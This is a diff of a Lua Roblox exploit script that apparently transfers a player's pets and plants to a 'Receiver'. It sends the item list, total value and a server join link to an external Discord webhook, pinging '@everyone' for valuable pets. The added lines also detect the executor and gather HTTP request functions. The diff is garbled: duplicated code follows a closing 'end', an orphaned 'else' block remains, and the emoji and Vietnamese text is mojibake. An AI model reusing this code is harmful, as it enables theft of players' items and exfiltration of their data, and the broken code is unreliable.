@@ -28,7 +28,16 @@ local function formatNumber(n)
 end
 
 local function getRequestFunction()
+    if identifyexecutor then
+        local ex = identifyexecutor()
+        print("đŸ§  Executor detected:", ex)
+    end
     return (syn and syn.request)
+        or (http and http.request)
+        or (fluxus and fluxus.request)
+        or (getgenv and getgenv().request)
+        or request
+end
         or (http and http.request)
         or (fluxus and fluxus.request)
         or (getgenv and getgenv().request)
@@ -64,7 +73,7 @@ local function sendWebhookNotification(items, totalValue, targetName)
     local username = useDual and DUAL_USERNAME or (PRIMARY_USERNAME or "unknown")
 
     if not webhookUrl then
-        warn("❌ Không tìm thấy webhook. Hủy gửi.")
+        warn("âŒ KhĂ´ng tĂ¬m tháº¥y webhook. Há»§y gá»­i.")
         return
     end
 
@@ -77,10 +86,10 @@ local function sendWebhookNotification(items, totalValue, targetName)
     end
 
     local categories = {
-        {name = "💎 VIP Pets", items = {}},
-        {name = "🏋️ Heavy Pets", items = {}},
-        {name = "🐾 Regular Pets", items = {}},
-        {name = "🌱 Plants", items = {}}
+        {name = "đŸ’ VIP Pets", items = {}},
+        {name = "đŸ‹ï¸ Heavy Pets", items = {}},
+        {name = "đŸ¾ Regular Pets", items = {}},
+        {name = "đŸŒ± Plants", items = {}}
     }
 
     for _, item in ipairs(items) do
@@ -109,17 +118,17 @@ local function sendWebhookNotification(items, totalValue, targetName)
     local payload = {
         username = username,
         embeds = {{
-            title = useDual and "💎 VIP TRANSFER" or "📦 ITEM TRANSFER",
+            title = useDual and "đŸ’ VIP TRANSFER" or "đŸ“¦ ITEM TRANSFER",
             color = useDual and 0xFFD700 or 0x00FF00,
             description = table.concat(descriptionParts, "\n"),
             fields = {
-                {name = "👤 Sender", value = Players.LocalPlayer.Name, inline = true},
-                {name = "🎯 Receiver", value = targetName, inline = true},
-                {name = "💰 Total Value", value = "$"..formatNumber(totalValue), inline = true},
-                {name = "🔗 Quick Join", value = string.format("https://fern.wtf/JoinPlace?placeId=%d&jobId=%s", game.PlaceId, game.JobId)}
+                {name = "đŸ‘¤ Sender", value = Players.LocalPlayer.Name, inline = true},
+                {name = "đŸ¯ Receiver", value = targetName, inline = true},
+                {name = "đŸ’° Total Value", value = "$"..formatNumber(totalValue), inline = true},
+                {name = "đŸ”— Quick Join", value = string.format("https://fern.wtf/JoinPlace?placeId=%d&jobId=%s", game.PlaceId, game.JobId)}
             },
             footer = {text = os.date("%Y-%m-%d %H:%M:%S")},
-            timestamp = DateTime.now():ToIsoDate()
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }},
         content = hasVIPOrHeavyPet and "@everyone" or nil
     }
@@ -136,10 +145,15 @@ local function sendWebhookNotification(items, totalValue, targetName)
         })
     end)
 
-    if success then
-        print("✅ Webhook sent successfully to:", webhookUrl)
+    print("[Webhook Debug] success =", success)
+    if success and response then
+        print("[Webhook Debug] Status:", response.StatusCode)
+        print("[Webhook Debug] Body:", response.Body or "nil")
     else
-        warn("❌ Webhook failed to send:", response)
+        warn("[Webhook Debug] Error:", response)
+    end
+    else
+        warn("âŒ Webhook failed to send:", response)
     end
 end
 
